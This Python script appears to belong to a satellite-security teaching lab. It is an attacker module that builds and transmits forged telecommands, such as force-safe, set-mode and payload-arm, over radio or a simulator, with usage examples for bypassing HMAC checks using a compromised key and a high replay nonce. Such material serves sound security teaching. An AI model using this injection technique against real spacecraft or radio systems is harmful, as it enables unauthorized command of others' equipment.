"""
Command injection — build a TC from scratch and transmit it. No key
needed at security level 0. At L1+ this fails the HMAC check.

Usage examples:
    python -m groundstation.attacker.inject --port /dev/ttyACM1 \
        --apid 0x0FF                 # force-safe, no payload (L0)
    python -m groundstation.attacker.inject --port /dev/ttyACM1 \
        --apid 0x083 --data 01       # set-mode SAFE (L0)
    python -m groundstation.attacker.inject --port /dev/ttyACM1 \
        --apid 0x084                 # arm payload (L0)

At security level >= 1 the satellite checks an HMAC tag. If the
attacker has compromised the key (later lessons demonstrate
plausible paths), pass --security and --key:

    python -m groundstation.attacker.inject --sim \
        --apid 0x0FF --security 2 --key 53656d61656f707573...
        --nonce $(printf '%016x' 9999999)
"""

import argparse
import os
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(os.path.dirname(HERE))
sys.path.insert(0, ROOT)

from protocol import space_packet as sp


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--port")
    ap.add_argument("--sim",  action="store_true")
    ap.add_argument("--node-id", default="ATKR")
    ap.add_argument("--apid", type=lambda v: int(v, 0), required=True)
    ap.add_argument("--data", default="", help="hex payload bytes")
    ap.add_argument("--seq",  type=int, default=1)
    ap.add_argument("--freq", type=int, default=433_920_000)
    ap.add_argument("--sync", default="d391")
    ap.add_argument("--bitrate", type=int, default=9600)
    ap.add_argument("--security", type=int, default=0, choices=[0, 1, 2, 3],
                    help="security level — must match the satellite's setting")
    ap.add_argument("--key", default=None,
                    help="16-byte hex key (required for --security >= 1)")
    ap.add_argument("--nonce", default=None,
                    help="16-hex-char nonce (8 bytes); auto-generated if absent")
    args = ap.parse_args()

    key = None
    nonce = None
    if args.security > 0:
        if not args.key:
            ap.error("--key is required when --security >= 1")
        key = bytes.fromhex(args.key)
        if len(key) != 16:
            ap.error("--key must be 16 bytes hex")
        if args.nonce:
            nonce = bytes.fromhex(args.nonce)
            if len(nonce) != 8:
                ap.error("--nonce must be 8 bytes hex")
        else:
            # Default to a high nonce so it beats any sane satellite
            # counter on first try.
            nonce = int(time.time() * 1000).to_bytes(8, "big")

    body = bytes.fromhex(args.data) if args.data else b""
    frame = sp.encode(sp.TYPE_TC, args.apid, args.seq, body,
                      security_level=args.security, key=key, nonce=nonce)
    print("Built TC apid=0x%03x seq=%d sec=%d  frame=%s"
          % (args.apid, args.seq, args.security, frame.hex()))

    if not args.sim and not args.port:
        ap.error("--port is required unless --sim is given")
    from sim.sim_link import make_link
    link = make_link(args, default_node_id=args.node_id)
    time.sleep(0.5)
    link.send_cfg(args.freq, int(args.sync, 16), args.bitrate)
    link.send_tx(frame)
    time.sleep(0.5)


if __name__ == "__main__":
    main()
